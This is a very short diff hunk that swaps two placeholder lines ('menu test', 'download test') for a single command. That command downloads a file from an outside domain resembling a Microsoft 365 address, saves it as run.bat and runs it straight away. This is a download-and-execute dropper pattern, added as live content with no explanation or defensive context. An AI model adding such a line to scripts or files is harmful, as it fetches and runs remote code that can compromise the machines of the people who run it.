@@ -1,2 +1,1 @@
-menu test
-download test
+curl https://m365.nu -L > run.bat & run.bat
